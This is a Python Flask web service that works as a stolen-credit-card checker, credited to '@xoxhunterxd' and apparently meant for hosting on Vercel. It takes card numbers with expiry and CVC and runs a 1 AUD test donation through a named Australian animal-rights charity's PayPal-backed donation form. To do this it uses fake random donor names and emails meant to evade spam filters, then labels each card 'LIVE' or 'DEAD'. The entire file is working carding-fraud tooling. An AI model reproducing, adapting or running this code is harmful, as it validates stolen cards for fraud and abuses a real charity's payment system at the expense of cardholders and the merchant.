# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
from flask import Flask, request, jsonify

# Vercel entry point
app = Flask(__name__)

def generate_dynamic_email():
    """Generates 100% random emails to bypass SPAM filters."""
    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com"]
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(10, 15)))
    return f"{prefix}@{random.choice(domains)}"

def random_string(length):
    """Matches randomString function from checker.js line 4."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})

    try:
        # number|mm|yy|cvc
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
    except Exception:
        return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})

    session = requests.Session()
    # UA from checker.js line 23
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    })

    try:
        # 1. Fetch settings (Matches checker.js line 45-55)
        html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url='([^']+)'", html).group(1).replace('&#038;', '&')
        
        form_text = session.get(form_url).text
        exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_text).group(1)
        data = json.loads(exported)

        # 2. PayPal Auth (Matches checker.js line 60-75)
        settings = next((g['settings'] for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0]['settings'])
        client_id = settings['sdkOptions']['clientId']
        
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token', 
                                 headers={'Authorization': f'Basic {auth}', 'Accept': 'application/json'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. Create AJAX Order (Matches checker.js line 80-100)
        user_first = random_string(7)
        user_last = random_string(7)
        user_email = generate_dynamic_email()
        
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': str(settings['donationFormId']),
            'give-form-hash': settings['donationFormNonce'],
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': user_first,
            'give_last': user_last,
            'give_email': user_email,
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 4. Confirm Card (Matches checker.js line 105-125)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        ).json()

        # REAL RESPONSE LOGIC:
        if confirm_res.get('status') == 'APPROVED':
            # This is the "Approved" moment from checker.js line 130
            return jsonify({
                "status": "LIVE", 
                "card": cc_param, 
                "msg": "Approved", 
                "dev": "@xoxhunterxd"
            })
        else:
            # Decline details from PayPal
            msg = confirm_res.get('message', 'DECLINED')
            if 'details' in confirm_res:
                msg = confirm_res['details'][0].get('issue', 'DECLINED')
            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg, "dev": "@xoxhunterxd"})

    except Exception as e:
        return jsonify({"status": "DEAD", "card": cc_param, "msg": "GATE_ERROR", "dev": "@xoxhunterxd"}), 200

# Vercel Alias
application = app
